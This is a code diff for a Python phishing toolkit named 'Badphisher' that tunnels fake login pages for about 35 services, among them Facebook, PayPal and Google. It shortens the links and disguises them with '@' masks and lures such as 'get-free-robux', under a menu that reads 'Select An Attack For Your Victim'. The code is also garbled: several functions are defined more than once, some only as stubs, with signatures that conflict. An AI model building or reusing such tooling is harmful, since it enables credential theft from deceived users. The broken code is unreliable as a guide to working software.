@@ -547,4 +547,438 @@ def start_loclx():
     setup_site()
     time.sleep(1)
 
-    opinion = input(f"{RED}[{WHITE}?{RED}]{O
+    opinion = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
+    loclx_region = "eu" if opinion == "y" else "us"
+
+    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")
+    
+    command = f"./.server/loclx tunnel --raw-mode http --region {loclx_region} --https-redirect -t {HOST}:{PORT}"
+    
+    if subprocess.run(["command", "-v", "termux-chroot"], stdout=subprocess.PIPE).returncode == 0:
+        command = f"termux-chroot {command}"
+
+    with open(".server/.loclx", "w") as loclx_file:
+        subprocess.Popen(command, shell=True, stdout=loclx_file, stderr=subprocess.STDOUT)
+
+    time.sleep(12)
+    
+    with open(".server/.loclx", "r") as loclx_file:
+        loclx_data = loclx_file.read()
+        loclx_url_match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', loclx_data)
+        if loclx_url_match:
+            loclx_url = loclx_url_match.group(0)
+            custom_url(loclx_url)
+            capture_data()
+
+def start_localhost():
+    """Start localhost server."""
+    cusport()
+    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
+    
+    setup_site()
+    
+    time.sleep(1)
+    os.system('clear')  # Simulate clearing the terminal
+    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at: {GREEN}{CYAN}http://{HOST}:{PORT}{RESET}")
+    
+    capture_data()
+
+# Define colors for terminal output
+RED = "\033[31m"
+WHITE = "\033[37m"
+GREEN = "\033[32m"
+ORANGE = "\033[33m"
+BLUE = "\033[34m"
+
+def banner_small():
+    """Display a small banner (placeholder)."""
+    print(f"{GREEN}=== Tunnel Selection ==={RESET}")
+
+def start_localhost():
+    """Start localhost server (placeholder)."""
+    print("Starting localhost...")  # Replace with actual implementation
+
+def start_cloudflared():
+    """Start Cloudflared (placeholder)."""
+    print("Starting Cloudflared...")  # Replace with actual implementation
+
+def start_loclx():
+    """Start LocalXpose (placeholder)."""
+    print("Starting LocalXpose...")  # Replace with actual implementation
+
+def tunnel_menu():
+    """Display the tunnel selection menu."""
+    os.system('clear')  # Clear the terminal
+    banner_small()
+    
+    print(f"""
+        {RED}[{WHITE}01{RED}]{ORANGE} Localhost
+        {RED}[{WHITE}02{RED}]{ORANGE} Cloudflared  {RED}[{CYAN}Auto Detects{RED}]
+        {RED}[{WHITE}03{RED}]{ORANGE} LocalXpose   {RED}[{CYAN}NEW! Max 15Min{RED}]
+    """)
+
+    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service : {BLUE}")
+
+    if reply in ('1', '01'):
+        start_localhost()
+    elif reply in ('2', '02'):
+        start_cloudflared()
+    elif reply in ('3', '03'):
+        start_loclx()
+    else:
+        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        time.sleep(1)
+        tunnel_menu()  # Recursively call to show the menu again
+        
+def custom_mask():
+    mask = "https://default-url.com"  # Default mask URL
+    mask_op = input("[?] Do you want to change Mask URL? [y/N]: ").strip().lower()
+    
+    if mask_op == "y":
+        print("\n[-] Enter your custom URL below (Example: https://get-free-followers.com)\n")
+        mask_url = input(" ==> ")
+        
+        # Validate the URL
+        if (mask_url.startswith("http://") or mask_url.startswith("https://")) and \
+           all(c not in mask_url for c in ['~', '!', '@', '%', ':', '=', '#', ';', '^', '*', '"', "'", '|', '?', '+', '<', '>', '(', ')', '{', '}', '\\']):
+            mask = mask_url
+            print(f"\n[-] Using custom Masked Url: {mask}")
+        else:
+            print("\n[!] Invalid url type.. Using the Default one..")
+    
+    return mask
+
+def site_stat(url):
+    if url:
+        try:
+            response = requests.head(url, allow_redirects=True)
+            return response.status_code
+        except requests.RequestException as e:
+            print(f"Error checking site status: {e}")
+            return None
+
+def shorten(url, service_url):
+    try:
+        response = requests.get(service_url + url, timeout=10)
+        response.raise_for_status()
+        
+        # Process the response based on the shortening service
+        if "shrtco.de" in service_url:
+            short_link = response.json().get('result', {}).get('short_link2')
+            return short_link
+        else:
+            return response.url  # For other services, simply return the final URL
+    except requests.RequestException as e:
+        print(f"Error shortening URL: {e}")
+        return None
+        
+def custom_url(url):
+    url = url.split("://")[-1]  # Remove the scheme (http or https)
+    isgd = "https://is.gd/create.php?format=simple&url="
+    shortcode = "https://api.shrtco.de/v2/shorten?url="
+    tinyurl = "https://tinyurl.com/api-create.php?url="
+
+    mask = custom_mask()  # Call to get the custom mask
+    time.sleep(1)  # Sleep for 1 second
+    clear_screen()  # Clear the screen (implement this function as needed)
+
+    if re.search(r"[-a-zA-Z0-9.]*?(trycloudflare\.com|loclx\.io)", url):
+        processed_url = None
+        
+        if site_stat(isgd) == 200:
+            processed_url = shorten(isgd, url)
+        elif site_stat(shortcode) == 200:
+            processed_url = shorten(shortcode, url)
+        else:
+            processed_url = shorten(tinyurl, url)
+
+        url = f"https://{url}"
+        masked_url = f"{mask}@{processed_url}"
+        processed_url = f"https://{processed_url}"
+    else:
+        url = "Unable to generate links. Try after turning on hotspot"
+        processed_url = "Unable to Short URL"
+
+    print(f"\n[ - ] URL 1 : {url}")
+    print(f"\n[ - ] URL 2 : {processed_url}")
+    if "Unable" not in processed_url:
+        print(f"\n[ - ] URL 3 : {masked_url}")
+        
+def site_facebook():
+    options = {
+        "1": ("facebook", "https://blue-verified-badge-for-facebook-free"),
+        "2": ("fb_advanced", "https://vote-for-the-best-social-media"),
+        "3": ("fb_security", "https://make-your-facebook-secured-and-free-from-hackers"),
+        "4": ("fb_messenger", "https://get-messenger-premium-features-free"),
+    }
+
+    print("\nSelect an option:")
+    for key, (website, mask) in options.items():
+        print(f"[{key}] {mask}")
+
+    reply = input("[ - ] Select an option: ")
+    
+    if reply in options:
+        website, mask = options[reply]
+        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
+    else:
+        print("\n[!] Invalid Option, Try Again...")
+        time.sleep(1)
+        clear_screen()  # Clear the screen (implement this function as needed)
+        site_facebook()  # Recursively call to show the options again
+
+def clear_screen():
+    # Implement your screen clearing logic here
+    pass
+
+def custom_mask():
+    # Implement your custom mask logic here
+    return "default_mask"  # Placeholder return value
+
+def site_stat(url):
+    try:
+        response = requests.head(url, allow_redirects=True)
+        return response.status_code
+    except requests.RequestException as e:
+        print(f"Error checking site status: {e}")
+        return None
+
+def shorten(service_url, url):
+    try:
+        response = requests.get(service_url + url, timeout=10)
+        response.raise_for_status()
+
+        if "shrtco.de" in service_url:
+            return response.json().get('result', {}).get('short_link2')
+        else:
+            return response.url  # For other services, simply return the final URL
+    except requests.RequestException as e:
+        print(f"Error shortening URL: {e}")
+        return None
+
+def tunnel_menu(website, mask):
+    # Implement your tunnel menu logic here
+    print(f"Tunneling for website: {website} with mask: {mask}")
+    
+
+def site_instagram():
+    options = {
+        "1": ("instagram", "https://get-unlimited-followers-for-instagram"),
+        "2": ("ig_followers", "https://get-unlimited-followers-for-instagram"),
+        "3": ("insta_followers", "https://get-1000-followers-for-instagram"),
+        "4": ("ig_verify", "https://blue-badge-verify-for-instagram-free"),
+    }
+
+    print("\nSelect an option:")
+    for key, (website, mask) in options.items():
+        print(f"[{key}] {mask}")
+
+    reply = input("[ - ] Select an option: ")
+
+    if reply in options:
+        website, mask = options[reply]
+        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
+    else:
+        print("\n[!] Invalid Option, Try Again...")
+        time.sleep(1)
+        clear_screen()  # Clear the screen (implement this function as needed)
+        site_instagram()  # Recursively call to show the options again
+
+
+def site_gmail():
+    options = {
+        "1": ("google", "https://get-unlimited-google-drive-free"),
+        "2": ("google_new", "https://get-unlimited-google-drive-free"),
+        "3": ("google_poll", "https://vote-for-the-best-social-media"),
+    }
+
+    print("\nSelect an option:")
+    for key, (website, mask) in options.items():
+        print(f"[{key}] {mask}")
+
+    reply = input("[ - ] Select an option: ")
+
+    if reply in options:
+        website, mask = options[reply]
+        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
+    else:
+        print("\n[!] Invalid Option, Try Again...")
+        time.sleep(1)
+        clear_screen()  # Clear the screen (implement this function as needed)
+        site_gmail()  # Recursively call to show the options again
+
+
+def site_vk():
+    options = {
+        "1": ("vk", "https://vk-premium-real-method-2020"),
+        "2": ("vk_poll", "https://vote-for-the-best-social-media"),
+    }
+
+    print("\nSelect an option:")
+    for key, (website, mask) in options.items():
+        print(f"[{key}] {mask}")
+
+    reply = input("[ - ] Select an option: ")
+
+    if reply in options:
+        website, mask = options[reply]
+        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
+    else:
+        print("\n[!] Invalid Option, Try Again...")
+        time.sleep(1)
+        clear_screen()  # Clear the screen (implement this function as needed)
+        site_vk()  # Recursively call to show the options again
+
+
+def clear_screen():
+    # Implement your screen clearing logic here
+    pass
+
+def tunnel_menu(website, mask):
+    # Implement your tunnel menu logic here
+    print(f"Tunneling for website: {website} with mask: {mask}")
+    
+def main_menu():
+    # Clear the screen (you can implement this function as needed)
+    clear_screen()
+    banner()  # Display a banner (implement this function as needed)
+    print()  # Print a blank line for spacing
+
+    menu_options = [
+        ("Facebook", "01"), ("Instagram", "02"), ("Google", "03"), ("Microsoft", "04"),
+        ("Netflix", "05"), ("Paypal", "06"), ("Steam", "07"), ("Twitter", "08"),
+        ("Playstation", "09"), ("Tiktok", "10"), ("Twitch", "11"), ("Pinterest", "12"),
+        ("Snapchat", "13"), ("Linkedin", "14"), ("Ebay", "15"), ("Quora", "16"),
+        ("Protonmail", "17"), ("Spotify", "18"), ("Reddit", "19"), ("Vk", "29"),
+        ("Origin", "23"), ("Badoo", "22"), ("Dropbox", "24"), ("Yahoo", "25"),
+        ("Wordpress", "26"), ("Yandex", "27"), ("StackoverFlow", "28"),
+        ("Adobe", "20"), ("XBOX", "30"), ("Mediafire", "31"), ("Gitlab", "32"),
+        ("Github", "33"), ("Discord", "34"), ("Roblox", "35")
+    ]
+
+    print("\033[31m[::]\033[33m Select An Attack For Your Victim \033[31m[::]\033[0m")
+    for name, code in menu_options:
+        print(f"\033[31m[{code}]\033[33m {name} ", end="")
+        if int(code) % 10 == 0:  # New line after every 10 options for better formatting
+            print()
+    print("\033[31m[99]\033[33m About \033[31m[00]\033[33m Exit\033[0m")
+
+    reply = input("\033[31m[-]\033[32m Select an option: \033[34m")
+
+    # Handle the user input
+    handle_selection(reply)
+    
+def clear_screen():
+    # Implement your screen clearing logic here (e.g., os.system('cls') for Windows or os.system('clear') for Unix)
+    pass
+def banner():
+    # Implement your banner display logic here
+    print("°|=============Badphisher============|°")
+
+def handle_selection(option):
+    if option == "00":
+        print("Exiting...")
+        exit(0)
+    elif option == "99":
+        print("About section...")
+        # Add logic for the About section
+    else:
+        print(f"You selected option: {option}")
+        # Add logic for handling other selections
+        
+
+def handle_selection(option):
+    website_mask_map = {
+        "1": ("facebook", None),
+        "2": ("instagram", None),
+        "3": ("gmail", None),
+        "4": ("microsoft", 'https://unlimited-onedrive-space-for-free'),
+        "5": ("netflix", 'https://upgrade-your-netflix-plan-free'),
+        "6": ("paypal", 'https://get-500-usd-free-to-your-account'),
+        "7": ("steam", 'https://steam-500-usd-gift-card-free'),
+        "8": ("twitter", 'https://get-blue-badge-on-twitter-free'),
+        "9": ("playstation", 'https://playstation-500-usd-gift-card-free'),
+        "10": ("tiktok", 'https://tiktok-free-liker'),
+        "11": ("twitch", 'https://unlimited-twitch-tv-user-for-free'),
+        "12": ("pinterest", 'https://get-a-premium-plan-for-pinterest-free'),
+        "13": ("snapchat", 'https://view-locked-snapchat-accounts-secretly'),
+        "14": ("linkedin", 'https://get-a-premium-plan-for-linkedin-free'),
+        "15": ("ebay", 'https://get-500-usd-free-to-your-account'),
+        "16": ("quora", 'https://quora-premium-for-free'),
+        "17": ("protonmail", 'https://protonmail-pro-basics-for-free'),
+        "18": ("spotify", 'https://convert-your-account-to-spotify-premium'),
+        "19": ("reddit", 'https://reddit-official-verified-member-badge'),
+        "20": ("adobe", 'https://get-adobe-lifetime-pro-membership-free'),
+        "21": ("deviantart", 'https://get-500-usd-free-to-your-account'),
+        "22": ("badoo", 'https://get-500-usd-free-to-your-account'),
+        "23": ("origin", 'https://get-500-usd-free-to-your-account'),
+        "24": ("dropbox", 'https://get-1TB-cloud-storage-free'),
+        "25": ("yahoo", 'https://grab-mail-from-anyother-yahoo-account-free'),
+        "26": ("wordpress", 'https://unlimited-wordpress-traffic-free'),
+        "27": ("yandex", 'https://grab-mail-from-anyother-yandex-account-free'),
+        "28": ("stackoverflow", 'https://get-stackoverflow-lifetime-pro-membership-free'),
+        "29": ("vk", None),  # Assuming site_vk() is defined
+        "30": ("xbox", 'https://get-500-usd-free-to-your-account'),
+        "31": ("mediafire", 'https://get-1TB-on-mediafire-free'),
+        "32": ("gitlab", 'https://get-1k-followers-on-gitlab-free'),
+        "33": ("github", 'https://get-1k-followers-on-github-free'),
+        "34": ("discord", 'https://get-discord-nitro-free'),
+        "35": ("roblox", 'https://get-free-robux'),
+        "99": ("about", None),  # Assuming about() is defined
+        "0": ("exit", None),    # Assuming msg_exit() is defined
+    }
+
+    # Normalize the input
+    option = option.lstrip("0")  # Remove leading zeros
+
+    if option in website_mask_map:
+        website, mask = website_mask_map[option]
+        
+        if mask:
+            tunnel_menu(website, mask)
+        elif website == "exit":
+            msg_exit()  # Call the exit function
+        elif website == "about":
+            about()  # Call the about function
+        else:
+            globals()[f'site_{website}']()  # Call the respective site function
+    else:
+        print("\n\033[31m[!]\033[31m Invalid Option, Try Again...")
+        time.sleep(1)
+        main_menu()  # Assuming you have a main_menu function defined
+
+def tunnel_menu(website, mask):
+    print(f"Selected website: {website} with mask: {mask}")
+    # Implement the logic for tunnel_menu here
+
+def site_facebook():
+    print("Facebook site action triggered.")
+    # Implement the logic for Facebook here
+
+def site_instagram():
+    print("Instagram site action triggered.")
+    # Implement the logic for Instagram here
+
+def site_gmail():
+    print("Gmail site action triggered.")
+    # Implement the logic for Gmail here
+
+# Define other site functions similarly...
+
+def site_vk():
+    print("VK site action triggered.")
+    # Implement the logic for VK here
+
+def about():
+    print("About section triggered.")
+    # Implement the logic for the About section here
+
+def msg_exit():
+    print("Exiting the program.")
+    exit()          
+    
+kill_pid()
+check_status()
+install_cloudflared()
+install_localxpose()
+main_menu()
